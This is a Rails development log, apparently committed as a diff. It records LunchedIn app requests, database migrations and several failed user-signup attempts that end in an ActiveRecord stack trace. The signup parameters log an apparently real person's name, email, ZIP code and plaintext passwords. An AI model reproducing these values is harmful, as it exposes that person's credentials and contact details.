+Processing VenuesController#show (for 127.0.0.1 at 2010-11-27 12:17:35) [GET]
+  Parameters: {"id"=>"1"}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.7ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mUser Load (0.4ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;35;1mVenue Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `venues`[0m
+  [4;36;1mVenue Load (0.4ms)[0m   [0;1mSELECT * FROM `venues` WHERE (`venues`.`id` = 1) [0m
+Rendering template within layouts/application
+Rendering venues/show
+DEPRECATION WARNING: Calling render with a string will render a partial from Rails 2.3. Change this call to render(:file => 'tags/cloud', :locals => locals_hash).. (called from render at /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/base.rb:243)
+  [4;35;1mJoin Table Columns (1.0ms)[0m   [0mSHOW FIELDS FROM `tags_venues`[0m
+  [4;36;1mTag Load (0.6ms)[0m   [0;1mSELECT * FROM `tags` INNER JOIN `tags_venues` ON `tags`.id = `tags_venues`.tag_id WHERE (`tags_venues`.venue_id = 1 ) [0m
+  [4;35;1mTag Columns (0.9ms)[0m   [0mSHOW FIELDS FROM `tags`[0m
+Rendered tags/_show (2.4ms)
+Rendered tags/_new (0.7ms)
+  [4;36;1mRating Load (0.2ms)[0m   [0;1mSELECT * FROM `ratings` WHERE (`ratings`.venue_id = 1) [0m
+  [4;35;1mRating Columns (1.0ms)[0m   [0mSHOW FIELDS FROM `ratings`[0m
+  [4;36;1mSQL (0.2ms)[0m   [0;1mSELECT avg(`ratings`.score) AS avg_score FROM `ratings` WHERE (venue_id = 1) [0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSELECT count(*) AS count_all FROM `ratings` WHERE (`ratings`.venue_id = 1) [0m
+Rendered ratings/_show (1.4ms)
+  [4;36;1mComment Load (0.2ms)[0m   [0;1mSELECT * FROM `comments` WHERE (`comments`.commentable_id = 1 AND `comments`.commentable_type = 'Venue') [0m
+  [4;35;1mComment Columns (1.0ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mRole Columns (1.1ms)[0m   [0;1mSHOW FIELDS FROM `roles`[0m
+  [4;35;1mRole Load (0.8ms)[0m   [0mSELECT * FROM `roles` WHERE (`roles`.`id` = 2) [0m
+Rendered comments/_comment (7.1ms)
+Rendered comments/_comment (0.6ms)
+  [4;36;1mCACHE (0.0ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+Rendered comments/_comment (1.9ms)
+Rendered comments/_new (1.0ms)
+Completed in 114ms (View: 40, DB: 4) | 200 OK [http://localhost/venues/1]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.2ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mSQL (0.5ms)[0m   [0;1mCREATE DATABASE `lunchedin_auth_production` DEFAULT CHARACTER SET `utf8` COLLATE `utf8_general_ci`[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mSQL (0.3ms)[0m   [0mCREATE DATABASE `lunchedin_auth_development` DEFAULT CHARACTER SET `utf8` COLLATE `utf8_general_ci`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mSQL (0.3ms)[0m   [0;1mCREATE DATABASE `lunchedin_auth_test` DEFAULT CHARACTER SET `utf8` COLLATE `utf8_general_ci`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mSQL (0.2ms)[0m   [0;1mSHOW TABLES[0m
+  [4;35;1mSQL (87.8ms)[0m   [0mCREATE TABLE `schema_migrations` (`version` varchar(255) NOT NULL) ENGINE=InnoDB[0m
+  [4;36;1mSQL (118.9ms)[0m   [0;1mCREATE UNIQUE INDEX `unique_schema_migrations` ON `schema_migrations` (`version`)[0m
+  [4;35;1mSQL (0.4ms)[0m   [0mSHOW TABLES[0m
+  [4;36;1mSQL (0.3ms)[0m   [0;1mSELECT version FROM schema_migrations[0m
+Migrating to CreateUsers (1)
+  [4;35;1mSQL (140.9ms)[0m   [0mCREATE TABLE `users` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `first_name` varchar(255), `last_name` varchar(255), `username` varchar(255), `password` varchar(255), `email` varchar(255), `zip_code` varchar(255), `role_id` int(11) DEFAULT 2, `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mSQL (0.6ms)[0m   [0;1mINSERT INTO schema_migrations (version) VALUES ('1')[0m
+Migrating to CreateVenues (2)
+  [4;35;1mSQL (139.1ms)[0m   [0mCREATE TABLE `venues` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `name` varchar(255), `address_one` varchar(255), `address_two` varchar(255), `city` varchar(255), `state` varchar(255), `zip_code` varchar(255), `phone_number` varchar(255), `fax_number` varchar(255), `price` int(11) DEFAULT 2, `ratings_count` int(11) DEFAULT 0, `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mSQL (0.5ms)[0m   [0;1mINSERT INTO schema_migrations (version) VALUES ('2')[0m
+Migrating to CreateEvents (3)
+  [4;35;1mSQL (130.4ms)[0m   [0mCREATE TABLE `events` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `name` varchar(255), `occurs_on` datetime, `status` varchar(255) DEFAULT 'planning', `notes` text, `user_id` int(11), `venue_id` int(11), `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mSQL (0.8ms)[0m   [0;1mINSERT INTO schema_migrations (version) VALUES ('3')[0m
+Migrating to CreateComments (4)
+  [4;35;1mSQL (98.5ms)[0m   [0mCREATE TABLE `comments` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `subject` varchar(255), `body` text, `commentable_id` int(11), `commentable_type` varchar(255), `user_id` int(11), `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mSQL (0.9ms)[0m   [0;1mINSERT INTO schema_migrations (version) VALUES ('4')[0m
+Migrating to CreateCategories (5)
+  [4;35;1mSQL (111.9ms)[0m   [0mCREATE TABLE `categories` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `name` varchar(255), `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mSQL (1.2ms)[0m   [0;1mINSERT INTO schema_migrations (version) VALUES ('5')[0m
+Migrating to CreateTags (6)
+  [4;35;1mSQL (119.8ms)[0m   [0mCREATE TABLE `tags` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `name` varchar(255), `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mSQL (0.8ms)[0m   [0;1mINSERT INTO schema_migrations (version) VALUES ('6')[0m
+Migrating to CreateTagsVenues (7)
+  [4;35;1mSQL (88.3ms)[0m   [0mCREATE TABLE `tags_venues` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `venue_id` int(11), `tag_id` int(11), `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mSQL (0.7ms)[0m   [0;1mINSERT INTO schema_migrations (version) VALUES ('7')[0m
+Migrating to CreateRatings (8)
+  [4;35;1mSQL (104.4ms)[0m   [0mCREATE TABLE `ratings` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `venue_id` int(11), `user_id` int(11), `score` int(11), `ratings_count` int(11), `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mSQL (0.7ms)[0m   [0;1mINSERT INTO schema_migrations (version) VALUES ('8')[0m
+Migrating to CreateAttendees (9)
+  [4;35;1mSQL (98.7ms)[0m   [0mCREATE TABLE `attendees` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `name` varchar(255), `email` varchar(255), `status` varchar(255) DEFAULT 'invited', `event_id` int(11), `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mSQL (0.6ms)[0m   [0;1mINSERT INTO schema_migrations (version) VALUES ('9')[0m
+Migrating to CreateRoles (10)
+  [4;35;1mSQL (97.4ms)[0m   [0mCREATE TABLE `roles` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `name` varchar(255), `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mRole Columns (29.5ms)[0m   [0;1mSHOW FIELDS FROM `roles`[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mBEGIN[0m
+  [4;36;1mRole Exists (0.2ms)[0m   [0;1mSELECT `roles`.id FROM `roles` WHERE (`roles`.`name` = BINARY 'admin') LIMIT 1[0m
+  [4;35;1mRole Create (0.2ms)[0m   [0mINSERT INTO `roles` (`name`, `created_at`, `updated_at`) VALUES('admin', '2010-12-02 01:49:28', '2010-12-02 01:49:28')[0m
+  [4;36;1mSQL (0.6ms)[0m   [0;1mCOMMIT[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mBEGIN[0m
+  [4;36;1mRole Exists (0.2ms)[0m   [0;1mSELECT `roles`.id FROM `roles` WHERE (`roles`.`name` = BINARY 'user') LIMIT 1[0m
+  [4;35;1mRole Create (0.1ms)[0m   [0mINSERT INTO `roles` (`name`, `created_at`, `updated_at`) VALUES('user', '2010-12-02 01:49:28', '2010-12-02 01:49:28')[0m
+  [4;36;1mSQL (0.7ms)[0m   [0;1mCOMMIT[0m
+  [4;35;1mSQL (0.5ms)[0m   [0mINSERT INTO schema_migrations (version) VALUES ('10')[0m
+  [4;36;1mSQL (0.6ms)[0m   [0;1mSHOW TABLES[0m
+  [4;35;1mSQL (0.2ms)[0m   [0mSELECT version FROM schema_migrations[0m
+  [4;36;1mSQL (0.3ms)[0m   [0;1mSHOW TABLES[0m
+  [4;35;1mSQL (1.1ms)[0m   [0mSHOW FIELDS FROM `attendees`[0m
+  [4;36;1mSQL (1.5ms)[0m   [0;1mdescribe `attendees`[0m
+  [4;35;1mSQL (1.3ms)[0m   [0mSHOW KEYS FROM `attendees`[0m
+  [4;36;1mSQL (1.0ms)[0m   [0;1mSHOW FIELDS FROM `categories`[0m
+  [4;35;1mSQL (1.4ms)[0m   [0mdescribe `categories`[0m
+  [4;36;1mSQL (0.6ms)[0m   [0;1mSHOW KEYS FROM `categories`[0m
+  [4;35;1mSQL (1.1ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mSQL (1.8ms)[0m   [0;1mdescribe `comments`[0m
+  [4;35;1mSQL (0.8ms)[0m   [0mSHOW KEYS FROM `comments`[0m
+  [4;36;1mSQL (1.1ms)[0m   [0;1mSHOW FIELDS FROM `events`[0m
+  [4;35;1mSQL (1.6ms)[0m   [0mdescribe `events`[0m
+  [4;36;1mSQL (0.8ms)[0m   [0;1mSHOW KEYS FROM `events`[0m
+  [4;35;1mSQL (0.9ms)[0m   [0mSHOW FIELDS FROM `ratings`[0m
+  [4;36;1mSQL (1.5ms)[0m   [0;1mdescribe `ratings`[0m
+  [4;35;1mSQL (0.6ms)[0m   [0mSHOW KEYS FROM `ratings`[0m
+  [4;36;1mSQL (54.9ms)[0m   [0;1mSHOW FIELDS FROM `roles`[0m
+  [4;35;1mSQL (1.2ms)[0m   [0mdescribe `roles`[0m
+  [4;36;1mSQL (0.6ms)[0m   [0;1mSHOW KEYS FROM `roles`[0m
+  [4;35;1mSQL (1.0ms)[0m   [0mSHOW FIELDS FROM `tags`[0m
+  [4;36;1mSQL (1.4ms)[0m   [0;1mdescribe `tags`[0m
+  [4;35;1mSQL (0.9ms)[0m   [0mSHOW KEYS FROM `tags`[0m
+  [4;36;1mSQL (1.0ms)[0m   [0;1mSHOW FIELDS FROM `tags_venues`[0m
+  [4;35;1mSQL (1.4ms)[0m   [0mdescribe `tags_venues`[0m
+  [4;36;1mSQL (0.7ms)[0m   [0;1mSHOW KEYS FROM `tags_venues`[0m
+  [4;35;1mSQL (1.0ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (1.6ms)[0m   [0;1mdescribe `users`[0m
+  [4;35;1mSQL (0.7ms)[0m   [0mSHOW KEYS FROM `users`[0m
+  [4;36;1mSQL (1.8ms)[0m   [0;1mSHOW FIELDS FROM `venues`[0m
+  [4;35;1mSQL (1.8ms)[0m   [0mdescribe `venues`[0m
+  [4;36;1mSQL (0.9ms)[0m   [0;1mSHOW KEYS FROM `venues`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mSQL (0.4ms)[0m   [0;1mSHOW TABLES[0m
+  [4;35;1mSQL (0.2ms)[0m   [0mSELECT version FROM schema_migrations[0m
+Migrating to CreateUsers (1)
+Migrating to CreateVenues (2)
+Migrating to CreateEvents (3)
+Migrating to CreateComments (4)
+Migrating to CreateCategories (5)
+Migrating to CreateTags (6)
+Migrating to CreateTagsVenues (7)
+Migrating to CreateRatings (8)
+Migrating to CreateAttendees (9)
+Migrating to CreateRoles (10)
+Migrating to AddSaltToUser (20101202015144)
+  [4;36;1mSQL (227.7ms)[0m   [0;1mALTER TABLE `users` ADD `salt` varchar(255)[0m
+  [4;35;1mSQL (0.8ms)[0m   [0mINSERT INTO schema_migrations (version) VALUES ('20101202015144')[0m
+  [4;36;1mSQL (0.5ms)[0m   [0;1mSHOW TABLES[0m
+  [4;35;1mSQL (0.2ms)[0m   [0mSELECT version FROM schema_migrations[0m
+  [4;36;1mSQL (0.4ms)[0m   [0;1mSHOW TABLES[0m
+  [4;35;1mSQL (1.1ms)[0m   [0mSHOW FIELDS FROM `attendees`[0m
+  [4;36;1mSQL (1.7ms)[0m   [0;1mdescribe `attendees`[0m
+  [4;35;1mSQL (1.4ms)[0m   [0mSHOW KEYS FROM `attendees`[0m
+  [4;36;1mSQL (1.2ms)[0m   [0;1mSHOW FIELDS FROM `categories`[0m
+  [4;35;1mSQL (1.4ms)[0m   [0mdescribe `categories`[0m
+  [4;36;1mSQL (0.6ms)[0m   [0;1mSHOW KEYS FROM `categories`[0m
+  [4;35;1mSQL (1.1ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mSQL (1.8ms)[0m   [0;1mdescribe `comments`[0m
+  [4;35;1mSQL (0.8ms)[0m   [0mSHOW KEYS FROM `comments`[0m
+  [4;36;1mSQL (0.9ms)[0m   [0;1mSHOW FIELDS FROM `events`[0m
+  [4;35;1mSQL (1.7ms)[0m   [0mdescribe `events`[0m
+  [4;36;1mSQL (0.9ms)[0m   [0;1mSHOW KEYS FROM `events`[0m
+  [4;35;1mSQL (0.9ms)[0m   [0mSHOW FIELDS FROM `ratings`[0m
+  [4;36;1mSQL (1.7ms)[0m   [0;1mdescribe `ratings`[0m
+  [4;35;1mSQL (0.8ms)[0m   [0mSHOW KEYS FROM `ratings`[0m
+  [4;36;1mSQL (0.8ms)[0m   [0;1mSHOW FIELDS FROM `roles`[0m
+  [4;35;1mSQL (1.5ms)[0m   [0mdescribe `roles`[0m
+  [4;36;1mSQL (52.3ms)[0m   [0;1mSHOW KEYS FROM `roles`[0m
+  [4;35;1mSQL (1.3ms)[0m   [0mSHOW FIELDS FROM `tags`[0m
+  [4;36;1mSQL (1.5ms)[0m   [0;1mdescribe `tags`[0m
+  [4;35;1mSQL (0.7ms)[0m   [0mSHOW KEYS FROM `tags`[0m
+  [4;36;1mSQL (0.9ms)[0m   [0;1mSHOW FIELDS FROM `tags_venues`[0m
+  [4;35;1mSQL (1.5ms)[0m   [0mdescribe `tags_venues`[0m
+  [4;36;1mSQL (0.7ms)[0m   [0;1mSHOW KEYS FROM `tags_venues`[0m
+  [4;35;1mSQL (1.1ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (1.8ms)[0m   [0;1mdescribe `users`[0m
+  [4;35;1mSQL (0.8ms)[0m   [0mSHOW KEYS FROM `users`[0m
+  [4;36;1mSQL (1.0ms)[0m   [0;1mSHOW FIELDS FROM `venues`[0m
+  [4;35;1mSQL (1.8ms)[0m   [0mdescribe `venues`[0m
+  [4;36;1mSQL (0.7ms)[0m   [0;1mSHOW KEYS FROM `venues`[0m
+
+
+Processing UsersController#new (for 127.0.0.1 at 2010-12-01 21:05:23) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 43ms (View: 36, DB: 1) | 200 OK [http://localhost/users/new]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-12-01 21:05:56) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296", "user"=>{"zip_code"=>"20148", "password_confirmation"=>"glorious1", "username"=>"cragan", "last_name"=>"Ragan", "password"=>"glorious1", "email"=>"christine.ragan@gmail.com", "first_name"=>"Christine"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (0.8ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mUser Exists (0.2ms)[0m   [0mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'cragan') LIMIT 1[0m
+  [4;36;1mSQL (0.2ms)[0m   [0;1mROLLBACK[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 239ms (View: 6, DB: 3) | 200 OK [http://localhost/users]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-12-01 21:06:19) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296", "user"=>{"zip_code"=>"20148", "password_confirmation"=>"glorious1", "username"=>"cragan", "last_name"=>"Ragan", "password"=>"glorious1", "email"=>"christine.ragan@gmail.com", "first_name"=>"Christine"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (1.0ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mUser Exists (0.3ms)[0m   [0mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'cragan') LIMIT 1[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mROLLBACK[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 24ms (View: 11, DB: 3) | 200 OK [http://localhost/users]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-12-01 21:06:45) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296", "user"=>{"zip_code"=>"20148", "password_confirmation"=>"g", "username"=>"cragan", "last_name"=>"Ragan", "password"=>"g", "email"=>"christine.ragan@gmail.com", "first_name"=>"Christine"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (0.9ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mUser Exists (0.2ms)[0m   [0mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'cragan') LIMIT 1[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mROLLBACK[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 25ms (View: 10, DB: 3) | 200 OK [http://localhost/users]
+
+
+Processing UsersController#new (for 127.0.0.1 at 2010-12-01 21:08:57) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 13ms (View: 7, DB: 1) | 200 OK [http://localhost/users/new]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-12-01 21:09:25) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296", "user"=>{"zip_code"=>"20148", "password_confirmation"=>"glorious1", "username"=>"cragan", "last_name"=>"Ragan", "password"=>"glorious1", "email"=>"christineragan@gmail.com", "first_name"=>"Christine"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.3ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mUser Exists (0.3ms)[0m   [0mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'cragan') LIMIT 1[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mROLLBACK[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 87ms (View: 5, DB: 2) | 200 OK [http://localhost/users]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-12-01 21:09:37) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296", "user"=>{"zip_code"=>"20148", "password_confirmation"=>"glorious", "username"=>"cragan", "last_name"=>"Ragan", "password"=>"glorious", "email"=>"christineragan@gmail.com", "first_name"=>"Christine"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mUser Exists (0.2ms)[0m   [0mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'cragan') LIMIT 1[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mROLLBACK[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 16ms (View: 6, DB: 2) | 200 OK [http://localhost/users]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-12-01 21:09:46) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296", "user"=>{"zip_code"=>"20148", "password_confirmation"=>"g", "username"=>"cragan", "last_name"=>"Ragan", "password"=>"g", "email"=>"christineragan@gmail.com", "first_name"=>"Christine"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (0.2ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mUser Exists (0.2ms)[0m   [0mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'cragan') LIMIT 1[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mROLLBACK[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 19ms (View: 7, DB: 2) | 200 OK [http://localhost/users]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-12-01 21:10:46) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296", "user"=>{"zip_code"=>"20148", "password_confirmation"=>"g", "username"=>"cragan", "last_name"=>"Ragan", "password"=>"g", "email"=>"christineragan@gmail.com", "first_name"=>"Christine"}}
+  [4;36;1mSQL (0.2ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (5.1ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+
+
+ActiveRecord::UnknownAttributeError (unknown attribute: password_confirmation):
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/base.rb:2587:in `attributes='
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/base.rb:2583:in `each'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/base.rb:2583:in `attributes='
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/base.rb:2283:in `initialize'
+    /app/controllers/users_controller.rb:25:in `new'
+    /app/controllers/users_controller.rb:25:in `create'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:1253:in `send'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:1253:in `perform_action_without_filters'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/filters.rb:617:in `call_filters'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/filters.rb:610:in `perform_action_without_benchmark'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/benchmarking.rb:68:in `perform_action_without_rescue'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/1.8/benchmark.rb:293:in `measure'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/benchmarking.rb:68:in `perform_action_without_rescue'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/rescue.rb:136:in `perform_action_without_caching'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/caching/sql_cache.rb:13:in `perform_action'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/connection_adapters/abstract/query_cache.rb:34:in `cache'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/query_cache.rb:8:in `cache'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/caching/sql_cache.rb:12:in `perform_action'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:524:in `send'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:524:in `process_without_filters'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/filters.rb:606:in `process_without_session_management_support'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/session_management.rb:134:in `process'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:392:in `process'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:183:in `handle_request'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:110:in `dispatch_unlocked'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:123:in `dispatch'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:122:in `synchronize'
